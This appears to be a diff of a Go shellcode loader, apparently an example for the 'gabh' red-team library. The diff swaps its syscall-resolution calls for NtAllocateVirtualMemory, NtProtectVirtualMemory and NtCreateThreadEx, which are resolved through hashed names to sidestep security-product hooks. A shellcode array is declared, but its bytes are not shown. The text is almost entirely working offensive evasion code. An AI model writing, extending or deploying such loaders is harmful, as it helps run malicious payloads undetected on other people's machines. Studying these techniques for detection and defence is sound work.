@@ -31,15 +31,15 @@ var shellcode = []byte{
 
 func main() {
 	var thisThread = uintptr(0xffffffffffffffff)
-	alloc,e := gabh.NtdllHgate(str2sha1("NtAllocateVirtualMemory"),str2sha1)
+	alloc,e := gabh.MemHgate(str2sha1("NtAllocateVirtualMemory"),str2sha1)
 	if e != nil {
 		panic(e)
 	}
-	protect,e := gabh.NtdllHgate(Sha256Hex("NtProtectVirtualMemory"),Sha256Hex)
+	protect,e := gabh.DiskHgate(Sha256Hex("NtProtectVirtualMemory"),Sha256Hex)
 	if e != nil {
 		panic(e)
 	}
-	createthread,e := gabh.NtdllHgate(Sha256Hex("NtCreateThreadEx"),Sha256Hex)
+	createthread,e := gabh.MemHgate(Sha256Hex("NtCreateThreadEx"),Sha256Hex)
 	if e != nil {
 		panic(e)
 	}
